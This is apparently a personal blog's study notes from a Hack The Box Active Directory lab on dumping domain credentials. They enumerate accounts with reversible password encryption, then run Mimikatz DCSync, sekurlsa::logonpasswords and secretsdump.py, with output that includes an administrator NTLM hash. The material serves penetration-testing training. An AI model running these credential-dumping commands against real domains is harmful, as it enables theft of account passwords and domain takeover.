<p>When this option is set on a user account, it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption.<br>The trick here is that the key needed to decrypt them is stored in the registry (the <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview">Syskey</a>) and can be extracted by a Domain Admin or equivalent. </p>
<p>Tools such as <code>secretsdump.py</code> will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync. If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption.<br>Any passwords set on accounts with this setting enabled will be stored using reversible encryption until they are changed. We can enumerate this using the <code>Get-ADUser</code> cmdlet:</p>
<h4 id="Enumerating-Further"><a href="#Enumerating-Further" class="headerlink" title="Enumerating Further"></a>Enumerating Further</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> <span class="string">&#x27;userAccountControl -band 128&#x27;</span> <span class="literal">-Properties</span> userAccountControl</span><br><span class="line"></span><br><span class="line">DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Enabled            : True</span><br><span class="line">GivenName          :</span><br><span class="line">Name               : PROXYAGENT</span><br><span class="line">ObjectClass        : user</span><br><span class="line">ObjectGUID         : c72d37d9<span class="literal">-e9ff-4e54-9afa-77775eaaf334</span></span><br><span class="line">SamAccountName     : proxyagent</span><br><span class="line">SID                : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5222</span></span><br><span class="line">Surname            :</span><br><span class="line">userAccountControl : <span class="number">640</span></span><br><span class="line">UserPrincipalName  :</span><br></pre></td></tr></table></figure>
<h2 id="Reversible-Encryption"><a href="#Reversible-Encryption" class="headerlink" title="Reversible Encryption"></a>Reversible Encryption</h2><p>Reversible encryption is a method of storing passwords in a way that they can be decrypted back into their original plain text form.</p>
<p>Instead of hashing a password (which is one-way), reversible encryption encrypts it in a two-way format — it can be both encrypted and decrypted.</p>
<p>This is not secure and is generally discouraged because if an attacker gains access to the encrypted passwords, they can easily retrieve the plain-text versions.<br><img src="/../images/reversible-encryp.png" alt="alt text"></p>
<p>We can see that one account, <code>proxyagent</code>, has the reversible encryption option set with PowerView</p>
<h3 id="Enumerating-Reversible-Encryption-Option-using-PowerView"><a href="#Enumerating-Reversible-Encryption-Option-using-PowerView" class="headerlink" title="Enumerating Reversible Encryption Option using PowerView"></a>Enumerating Reversible Encryption Option using PowerView</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\htb&gt; Get-DomainUser -Identity * | ? &#123;$_.useraccountcontrol -like &#x27;*ENCRYPTED_TEXT_PWD_ALLOWED*&#x27;&#125; |select samaccountname,useraccountcontrol</span><br><span class="line"></span><br><span class="line">samaccountname                         useraccountcontrol</span><br><span class="line">--------------                         ------------------</span><br><span class="line">proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT</span><br></pre></td></tr></table></figure>

<p>We will notice the tool decrypted the password and provided us with the cleartext value.</p>
<p>Also it is important to note that Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize<code>runas.exe</code> to accomplish this:</p>
<h4 id="Using-runas-exe-1"><a href="#Using-runas-exe-1" class="headerlink" title="Using runas.exe"></a>Using runas.exe</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows [Version 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;runas /netonly /user:INLANEFREIGHT\adunn powershell</span><br><span class="line">Enter the password for INLANEFREIGHT\adunn:</span><br><span class="line">Attempting to start powershell as user &quot;INLANEFREIGHT\adunn&quot; ...</span><br></pre></td></tr></table></figure>

<p>From the newly spawned powershell session, we can perform the attack:</p>
<h4 id="DCSyncing"><a href="#DCSyncing" class="headerlink" title="DCSyncing"></a>DCSyncing</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; .\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line">=================================================================</span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT\administrator&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : Administrator</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : administrator</span><br><span class="line">User Principal Name  : administrator@inlanefreight.local</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">10</span>/<span class="number">27</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">49</span>:<span class="number">32</span> AM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-500</span></span><br><span class="line">Object Relative ID   : <span class="number">500</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">88</span>ad09182de639ccc6579eb0849751cf</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">4625</span>fd0c31368ff4c255a3b876eaac3d</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>


<p>Credentails in memory -&gt; doesnt work past server 2012</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>


<p><code>requires sereplication privilege, check for that acl type</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$SID = Convert-Name-TO-SID &lt;name&gt;</span><br><span class="line">get-domainobjectACL -ResolveGUIDs -Identity * | ? &#123;$_.SecurityIdentifier -eq $SID&#125;</span><br></pre></td></tr></table></figure>

<p>#dcsyncing</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./mimikatz.exe</span><br><span class="line"></span><br><span class="line"># lsadump::dcsync /domain:&#123;&#125; /user:&#123;domain\targetuser&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="dcsync-linux-1"><a href="#dcsync-linux-1" class="headerlink" title="dcsync linux"></a>dcsync linux</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/tpetty@172.16.6.3</span><br></pre></td></tr></table></figure>
	  <div class="article-footer-copyright">

</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2025/06/20/HTB-Writing custom wordlists using hashcat and cuppy/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2025/01/22/HTB-Cicada/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2025-03-26 
	</div>
	

	<!-- categories -->
    

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/mimikatz/">mimikatz<span>2</span></a></li> <li><a href="/tags/dcsync/">dcsync<span>1</span></a></li> <li><a href="/tags/AD/">AD<span>2</span></a></li> <li><a href="/tags/Active-Directory/">Active Directory<span>2</span></a></li> <li><a href="/tags/Lateral-Movement/">Lateral Movement<span>2</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 vipa0z's Blog
  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
